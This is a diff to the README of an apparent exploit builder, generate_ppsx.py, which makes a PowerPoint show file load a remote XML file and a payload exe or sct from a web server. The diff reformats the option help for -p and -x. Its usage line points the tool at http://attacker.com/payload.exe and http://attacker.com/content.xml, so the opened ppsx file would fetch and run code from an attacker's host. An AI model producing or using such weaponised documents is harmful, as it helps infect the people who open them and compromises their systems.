@@ -28,8 +28,10 @@ First open Microsoft Office Power Point and open 'template.ppsx'. Open your own 
         input_filename          The input ppsx file name.
 
         -o              Output .ppsx file name, (inlcude the .ppsx).
-        -p              The payload exe or sct file url. It must be in an accessible web server. (Optional)
-        -x              The full xml uri to be called by the ppsx file. It must be in an accessible web server.(Required)
+        -p              The payload exe or sct file url. 
+                        It must be in an accessible web server. (Optional for xml file)
+        -x              The full xml uri to be called by the ppsx file. 
+                        It must be in an accessible web server.(Required)
 
 ```
 python generate_ppsx.py -o output.ppsx -p http://attacker.com/payload.exe -x http://attacker.com/content.xml input.ppsx
